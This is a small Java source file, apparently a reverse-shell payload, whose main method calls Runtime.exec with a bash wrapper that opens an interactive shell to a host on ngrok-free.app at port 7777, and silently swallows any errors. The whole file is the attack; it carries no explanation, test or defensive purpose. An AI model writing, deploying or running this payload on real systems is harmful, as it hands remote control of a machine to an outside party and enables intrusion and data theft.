public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/a438-202-83-18-79.ngrok-free.app/7777 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
